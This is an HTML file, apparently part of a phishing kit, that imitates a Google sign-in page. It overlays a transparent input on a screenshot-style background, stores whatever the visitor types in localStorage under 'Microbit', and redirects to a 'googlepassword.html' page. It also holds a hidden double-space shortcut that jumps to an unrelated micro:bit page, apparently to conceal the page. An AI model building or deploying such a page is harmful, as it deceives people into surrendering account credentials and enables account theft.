<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicia sesión con Google</title>
    <!-- Cargar la fuente de Google -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-image: url('mail.png'); /* Imagen de fondo */
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Roboto', sans-serif;
        }

        .container {
            text-align: center;
            position: relative;
            width: 100%;
            height: 100%;
        }

        input[type="text"] {
            background: transparent;
            border: none;
            color: black;
            position: absolute;
            top: 29%;
            left: 270px;
            transform: translateX(-50%);
            width: 475px;
            height: 60px;
            font-size: 18px;
            padding: 5px;
            outline: none;
            opacity: 1;
            caret-color: black; /* Cambiar color del cursor a negro */
        }

        .save-button {
            opacity: 0;
            position: absolute;
            top: 68%;
            left: 340px;
            cursor: pointer;
            width: 120px;
            height: 50px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Cuadro de texto para ingresar -->
        <input type="text" id="textInput" placeholder="">
        
        <!-- Botón para guardar en localStorage y redirigir -->
        <button class="save-button" onclick="guardarYRedirigir()">Guardar y Redirigir</button>
    </div>

    <script>
        // Guardar el contenido en localStorage y redirigir
        function guardarYRedirigir() {
            const input = document.getElementById("textInput").value;
            if (input) {
                let Microbit = localStorage.getItem("Microbit") ? JSON.parse(localStorage.getItem("Microbit")) : [];
                Microbit.push(input);
                localStorage.setItem("Microbit", JSON.stringify(Microbit));

                // Redirigir a 2.html
                window.location.href = 'googlepassword.html';
            }
        }

        // Permitir guardar al presionar Enter
        document.getElementById("textInput").addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                guardarYRedirigir();
            }
        });

    </script>
<script>
    (function() {
        let spacePressedCount = 0;
        let lastKeyTime = 0;

        document.addEventListener('keydown', function(event) {
            const currentTime = new Date().getTime();
            if (event.code === 'Space') {
                if (currentTime - lastKeyTime <= 500) { // Tiempo máximo entre dos espacios (0.5 segundos)
                    spacePressedCount++;
                } else {
                    spacePressedCount = 1;
                }
                if (spacePressedCount === 2) {
                    window.location.href = "https://makecode.microbit.org/S47839-62259-05281-84936";
                }
            } else {
                spacePressedCount = 0;
            }
            lastKeyTime = currentTime;
        });
    })();
</script>

</body>
</html>
